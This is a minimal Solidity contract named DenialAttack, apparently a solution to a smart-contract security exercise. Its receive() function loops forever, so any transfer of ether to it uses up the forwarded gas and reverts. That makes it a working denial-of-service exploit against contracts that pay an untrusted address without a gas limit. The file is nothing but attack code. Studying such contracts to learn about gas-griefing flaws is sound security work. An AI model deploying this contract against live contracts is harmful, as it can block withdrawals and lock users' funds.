// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.6.0;

contract DenialAttack {
    receive() external payable {
        while (true) {}
    }
}
